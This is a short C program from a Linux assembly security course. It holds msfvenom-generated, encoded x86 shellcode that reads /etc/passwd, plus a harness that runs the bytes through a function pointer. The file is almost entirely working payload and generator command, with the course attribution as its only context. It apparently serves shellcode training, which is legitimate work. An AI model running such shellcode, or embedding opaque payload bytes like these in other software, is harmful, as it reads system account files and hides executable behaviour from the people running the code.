/** msfvenom -p linux/x86/read_file fd=1 path=/etc/passwd -b '\x00' -f c
 * \brief 
 * \details This was created as part of the SecurityTube Linux Assembly Expert
 * course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 * \author Travis Mathison
 * \copyright
 *
 * The MIT License (MIT)
 * 
 * Copyright (c) 2018 Travis Mathison
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xba\xb0\xf6\x73\xfc\xda\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x13\x83\xc6\x04\x31\x56\x0f\x03\x56\xbf\x14\x86\x17\x89\x60"
"\x6c\xe8\xf5\x90\x34\xd9\x3c\x5d\x4a\x90\x7d\xe6\x48\xa3\x81"
"\x17\xc6\x44\x08\xee\x62\x8a\x1a\x11\x93\x46\x9a\x98\x51\xe0"
"\x9e\x9a\x55\x11\x25\x9b\x55\x11\x59\x51\xd5\xa9\x58\x69\xd6"
"\xc9\xe1\x69\xd6\xc9\x15\xa7\x56\x21\xd0\xc8\xa8\x4d\xf5\x53"
"\x23\xd1\x26\xec\xaa\x66\x4b\x7b\x49\x89";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

	
